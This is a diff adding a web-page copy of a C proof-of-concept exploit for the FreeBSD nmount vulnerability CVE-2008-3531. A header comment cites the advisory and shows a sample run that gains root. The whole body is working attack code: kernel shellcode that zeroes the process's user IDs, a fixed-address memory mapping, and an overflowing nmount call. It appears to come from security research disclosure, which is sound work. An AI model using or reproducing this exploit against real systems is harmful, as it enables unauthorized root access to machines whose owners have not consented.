@@ -1,0 +1,133 @@
+<div class="commandline">/* <br />
+    * cve-2008-3531.c -- Patroklos Argyroudis, argp at domain census-labs.com<br />
+    *<br />
+    * Privilege escalation exploit for the FreeBSD-SA-08:08.nmount<br />
+    * (CVE-2008-3531) vulnerability:<br />
+    * <br />
+    * http://security.freebsd.org/advisories/FreeBSD-SA-08:08.nmount.asc<br />
+    * http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2008-3531<br />
+    *<br />
+    * For a detailed analysis see:<br />
+    *<br />
+    * http://census-labs.com/news/2009/07/02/cve-2008-3531-exploit/<br />
+    * <br />
+    * Sample run:<br />
+    * <br />
+    * [argp@leon ~]$ uname -rsi<br />
+    * FreeBSD 7.0-RELEASE GENERIC<br />
+    * [argp@leon ~]$ sysctl vfs.usermount<br />
+    * vfs.usermount: 1<br />
+    * [argp@leon ~]$ id<br />
+    * uid=1001(argp) gid=1001(argp) groups=1001(argp)<br />
+    * [argp@leon ~]$ gcc -Wall cve-2008-3531.c -o cve-2008-3531<br />
+    * [argp@leon ~]$ ./cve-2008-3531<br />
+    * [*] vptr = 0x006e776f<br />
+    * [*] calling nmount()<br />
+    * nmount: Unknown error: -1036235776<br />
+    * [argp@leon ~]$ id<br />
+    * uid=0(root) gid=0(wheel) egid=1001(argp) groups=1001(argp)<br />
+    *<br />
+    * $Id: cve-2008-3531.c,v 846ca34be34a 2009/02/29 11:05:02 argp $<br />
+    */<br />
+   <br />
+   #include &lt;sys/param.h&gt;<br />
+   #include &lt;sys/mount.h&gt;<br />
+   #include &lt;sys/uio.h&gt;<br />
+   #include &lt;err.h&gt;<br />
+   #include &lt;stdio.h&gt;<br />
+   #include &lt;stdlib.h&gt;<br />
+   #include &lt;string.h&gt;<br />
+   #include &lt;sysexits.h&gt;<br />
+   #include &lt;unistd.h&gt;<br />
+   #include &lt;sys/types.h&gt;<br />
+   #include &lt;sys/stat.h&gt;<br />
+   #include &lt;sys/mman.h&gt;<br />
+   <br />
+   #define BUFSIZE&nbsp;&nbsp;&nbsp;&nbsp; 249<br />
+   <br />
+   #define PAGESIZE&nbsp;&nbsp;&nbsp;&nbsp;4096<br />
+   #define ADDR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x6e7000<br />
+   #define OFFSET&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1903<br />
+   <br />
+   #define FSNAME&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"msdosfs"<br />
+   #define DIRPATH&nbsp;&nbsp;&nbsp;&nbsp; "/tmp/msdosfs"<br />
+   <br />
+   unsigned char kernelcode[] =<br />
+   "\x64\xa1\x00\x00\x00\x00"&nbsp;&nbsp; /* movl&nbsp;&nbsp;%fs:0, %eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# get curthread */<br />
+   "\x8b\x40\x04"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* movl&nbsp;&nbsp;0x4(%eax), %eax&nbsp;&nbsp;# get proc from curthread */<br />
+   "\x8b\x40\x30"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* movl&nbsp;&nbsp;0x30(%eax),%eax&nbsp;&nbsp;# get ucred from proc */<br />
+   "\x31\xc9"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* xorl&nbsp;&nbsp;%ecx, %ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # ecx = 0 */<br />
+   "\x89\x48\x04"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* movl&nbsp;&nbsp;%ecx, 0x4(%eax)&nbsp;&nbsp;# ucred.uid = 0 */<br />
+   "\x89\x48\x08"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* movl&nbsp;&nbsp;%ecx, 0x8(%eax)&nbsp;&nbsp;# ucred.ruid = 0 */<br />
+   &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* # return to the pre-previous function, i.e. vfs_donmount() */<br />
+   "\x81\xc4\xe8\x00\x00\x00"&nbsp;&nbsp; /* addl&nbsp;&nbsp;$0xe8, %esp */<br />
+   "\x5b"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* popl&nbsp;&nbsp;%ebx */<br />
+   "\x5e"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* popl&nbsp;&nbsp;%esi */<br />
+   "\x5f"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* popl&nbsp;&nbsp;%edi */<br />
+   "\x5d"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* popl&nbsp;&nbsp;%ebp */<br />
+   "\xc3";&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/* ret */<br />
+   <br />
+   int<br />
+   main()<br />
+   {<br />
+   &nbsp;&nbsp;&nbsp;&nbsp;void *vptr;<br />
+   &nbsp;&nbsp;&nbsp;&nbsp;struct iovec iov[6];<br />
+   <br />
+   &nbsp;&nbsp;&nbsp;&nbsp;vptr = mmap((void *)ADDR, PAGESIZE, PROT_READ | PROT_WRITE,<br />
+   &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MAP_FIXED | MAP_ANON | MAP_PRIVATE, -1, 0);<br />
+   <br />
+   &nbsp;&nbsp;&nbsp;&nbsp;if(vptr == MAP_FAILED)<br />
+   &nbsp;&nbsp;&nbsp;&nbsp;{<br />
+   &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;perror("mmap");<br />
+   &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(EXIT_FAILURE);<br />
+   &nbsp;&nbsp;&nbsp;&nbsp;}<br />
+   <br />
+   &nbsp;&nbsp;&nbsp;&nbsp;vptr += OFFSET;<br />
+   &nbsp;&nbsp;&nbsp;&nbsp;printf("[*] vptr = 0x%.8x\n", (unsigned int)vptr);<br />
+   <br />
+   &nbsp;&nbsp;&nbsp;&nbsp;memcpy(vptr, kernelcode, (sizeof(kernelcode) - 1));<br />
+   <br />
+   &nbsp;&nbsp;&nbsp;&nbsp;mkdir(DIRPATH, 0700);<br />
+   <br />
+   &nbsp;&nbsp;&nbsp;&nbsp;iov[0].iov_base = "fstype";<br />
+   &nbsp;&nbsp;&nbsp;&nbsp;iov[0].iov_len = strlen(iov[0].iov_base) + 1;<br />
+   &nbsp;&nbsp;&nbsp;&nbsp;<br />
+   &nbsp;&nbsp;&nbsp;&nbsp;iov[1].iov_base = FSNAME;<br />
+   &nbsp;&nbsp;&nbsp;&nbsp;iov[1].iov_len = strlen(iov[1].iov_base) + 1;<br />
+   &nbsp;&nbsp;&nbsp;&nbsp;<br />
+   &nbsp;&nbsp;&nbsp;&nbsp;iov[2].iov_base = "fspath";<br />
+   &nbsp;&nbsp;&nbsp;&nbsp;iov[2].iov_len = strlen(iov[2].iov_base) + 1;<br />
+   &nbsp;&nbsp;&nbsp;&nbsp;<br />
+   &nbsp;&nbsp;&nbsp;&nbsp;iov[3].iov_base = DIRPATH;<br />
+   &nbsp;&nbsp;&nbsp;&nbsp;iov[3].iov_len = strlen(iov[3].iov_base) + 1;<br />
+   <br />
+   &nbsp;&nbsp;&nbsp;&nbsp;iov[4].iov_base = calloc(BUFSIZE, sizeof(char));<br />
+   <br />
+   &nbsp;&nbsp;&nbsp;&nbsp;if(iov[4].iov_base == NULL)<br />
+   &nbsp;&nbsp;&nbsp;&nbsp;{<br />
+   &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;perror("calloc");<br />
+   &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rmdir(DIRPATH);<br />
+   &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(EXIT_FAILURE);<br />
+   &nbsp;&nbsp;&nbsp;&nbsp;}<br />
+   <br />
+   &nbsp;&nbsp;&nbsp;&nbsp;memset(iov[4].iov_base, 0x41, (BUFSIZE - 1));<br />
+   &nbsp;&nbsp;&nbsp;&nbsp;iov[4].iov_len = BUFSIZE;<br />
+   <br />
+   &nbsp;&nbsp;&nbsp;&nbsp;iov[5].iov_base = "BBBB";<br />
+   &nbsp;&nbsp;&nbsp;&nbsp;iov[5].iov_len = strlen(iov[5].iov_base) + 1;<br />
+   <br />
+   &nbsp;&nbsp;&nbsp;&nbsp;printf("[*] calling nmount()\n");<br />
+   <br />
+   &nbsp;&nbsp;&nbsp;&nbsp;if(nmount(iov, 6, 0) &lt; 0)<br />
+   &nbsp;&nbsp;&nbsp;&nbsp;{<br />
+   &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;perror("nmount");<br />
+   &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rmdir(DIRPATH);<br />
+   &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(EXIT_FAILURE);<br />
+   &nbsp;&nbsp;&nbsp;&nbsp;}<br />
+   <br />
+   &nbsp;&nbsp;&nbsp;&nbsp;printf("[*] unmounting and deleting %s\n", DIRPATH);<br />
+   &nbsp;&nbsp;&nbsp;&nbsp;unmount(DIRPATH, 0);<br />
+   &nbsp;&nbsp;&nbsp;&nbsp;rmdir(DIRPATH);<br />
+   <br />
+   &nbsp;&nbsp;&nbsp;&nbsp;return EXIT_SUCCESS;<br />
+   }</div>
